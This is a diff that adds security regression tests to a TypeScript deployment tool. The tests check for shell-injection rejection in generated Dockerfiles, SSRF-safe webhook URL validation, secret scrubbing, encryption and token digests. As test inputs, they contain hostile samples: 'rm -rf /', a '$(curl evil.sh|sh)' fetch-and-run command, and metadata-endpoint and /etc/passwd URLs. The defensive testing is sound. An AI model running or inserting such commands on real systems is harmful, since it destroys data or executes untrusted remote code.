@@ -34,6 +34,20 @@ import {
   generateDockerfile,
   parseExposePort,
 } from "../src/lib/git-deploy"
+import {
+  validIp,
+  isPrivateIp,
+  validateWebhookUrl,
+  scrub,
+  REDACTED as SEC_REDACTED,
+  encryptSecret,
+  decryptSecret,
+  tokenDigest,
+  mintToken,
+  hasShellMetachars,
+  execFormArgv,
+  shellQuote,
+} from "../src/lib/security"
 
 let n = 0
 const ok = (name: string) => console.log(`  ✓ ${name}`)
@@ -393,7 +407,9 @@ check("detectStackFromFiles + refineNodeStack: Dockerfile wins, else package.jso
 
 check("generateDockerfile: produces EXPOSE for node/next/static, refuses unknown", () => {
   const node = generateDockerfile({ stack: "node", startCmd: "node server.js" })
-  assert.ok(node && /EXPOSE 3000/.test(node) && /node server.js/.test(node))
+  // R5: CMD is exec-form argv JSON — ["node","server.js"], so shell metachars
+  // are literal text, never interpreted. Assert the JSON form, not shell text.
+  assert.ok(node && /EXPOSE 3000/.test(node) && /"node","server\.js"|"node",\s*"server\.js"/.test(node))
   const next = generateDockerfile({ stack: "nextjs" })
   assert.ok(next && /NEXT_TELEMETRY_DISABLED/.test(next))
   const stat = generateDockerfile({ stack: "static" })
@@ -401,6 +417,82 @@ check("generateDockerfile: produces EXPOSE for node/next/static, refuses unknown
   assert.equal(generateDockerfile({ stack: "unknown" }), null)
   assert.equal(generateDockerfile({ stack: "rust" }), null)
   assert.equal(parseExposePort("FROM x\nEXPOSE 8080\nCMD y"), 8080)
+})
+
+// R5: command injection — a build/start command carrying shell metacharacters
+// must NOT be emitted as an executable shell line.
+check("generateDockerfile: rejects shell-injection in build/start commands", () => {
+  const evil = generateDockerfile({ stack: "node", startCmd: "node x.js; rm -rf /" })
+  assert.equal(evil, null)
+  const evil2 = generateDockerfile({ stack: "node", buildCmd: "$(curl evil.sh|sh)" })
+  assert.equal(evil2, null)
+  const evil3 = generateDockerfile({ stack: "node", startCmd: "node `whoami`.js" })
+  assert.equal(evil3, null)
+  // safe commands still generate, and any emitted CMD is exec-form (no sh -c).
+  const ok = generateDockerfile({ stack: "node", startCmd: "node server.js" })
+  assert.ok(ok)
+  assert.ok(!/"sh",\s*"-c"/.test(ok), "CMD must be exec-form argv, not sh -c")
+})
+
+// ── security.ts helpers (R5/R6/R7) ──────────────────────────────────────────
+check("validIp: octet-range checked (999.999.999.999 rejected), IPv4+IPv6", () => {
+  assert.equal(validIp("999.999.999.999"), false)
+  assert.equal(validIp("256.0.0.1"), false)
+  assert.equal(validIp("104.214.169.39"), true)
+  assert.equal(validIp("::1"), true)
+  assert.equal(validIp("not-an-ip"), false)
+})
+
+check("isPrivateIp: loopback/private/link-local/metadata blocked, public allowed", () => {
+  for (const p of ["127.0.0.1", "10.1.2.3", "172.16.5.4", "192.168.1.1", "169.254.169.254", "0.0.0.0", "::1"]) {
+    assert.equal(isPrivateIp(p), true, `${p} must be private`)
+  }
+  assert.equal(isPrivateIp("104.214.169.39"), false)
+})
+
+check("validateWebhookUrl: blocks metadata/loopback/file/ftp, allows https", () => {
+  assert.equal(validateWebhookUrl("http://169.254.169.254/latest/meta-data").ok, false)
+  assert.equal(validateWebhookUrl("http://127.0.0.1:9000/hook").ok, false)
+  assert.equal(validateWebhookUrl("http://10.0.0.5/x").ok, false)
+  assert.equal(validateWebhookUrl("file:///etc/passwd").ok, false)
+  assert.equal(validateWebhookUrl("ftp://evil/x").ok, false)
+  assert.equal(validateWebhookUrl("gopher://x").ok, false)
+  assert.equal(validateWebhookUrl("https://hooks.slack.com/services/T/B/x").ok, true)
+  assert.equal(validateWebhookUrl("https://discord.com/api/webhooks/1/2").ok, true)
+})
+
+check("scrub: redacts registry auth, jwt, password fields by default", () => {
+  const reg = [{ name: "ghcr", url: "ghcr.io", auth: "dXNlcjpwYXNzd29yZDEyMzQ1Njc4" }]
+  const out = scrub(reg) as { auth: string }[]
+  assert.equal(out[0].auth, SEC_REDACTED)
+  assert.equal(scrub({ jwt: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.payload.sig" })["jwt"], SEC_REDACTED)
+  assert.equal(scrub({ url: "https://ok" })["url"], "https://ok")
+})
+
+check("encrypt/decrypt secret: round-trips, ciphertext never contains plaintext", () => {
+  process.env.SLIPWAY_MASTER_KEY = "a".repeat(64)
+  const pw = "sup3r-secret-db-password"
+  const enc = encryptSecret(pw)
+  assert.ok(enc.startsWith("v1:"))
+  assert.ok(!enc.includes(pw), "ciphertext must not contain the plaintext")
+  assert.equal(decryptSecret(enc), pw)
+  delete process.env.SLIPWAY_MASTER_KEY
+})
+
+check("tokenDigest/mintToken: sha256 index, slipway_ prefix, no plaintext reuse", () => {
+  const t = mintToken()
+  assert.ok(t.startsWith("slipway_") && t.length > 20)
+  const d = tokenDigest(t)
+  assert.equal(d.length, 64)
+  assert.notEqual(d, t)
+})
+
+check("hasShellMetachars + execFormArgv + shellQuote", () => {
+  assert.equal(hasShellMetachars("node x.js; rm -rf /"), true)
+  assert.equal(hasShellMetachars("$(curl x|sh)"), true)
+  assert.equal(hasShellMetachars("node server.js"), false)
+  assert.deepEqual(execFormArgv('nginx -g "daemon off;"'), ["nginx", "-g", "daemon off;"])
+  assert.equal(shellQuote("it's"), "'it'\\''s'")
 })
 
 console.log(`\n  ${n} checks passed ✓`)
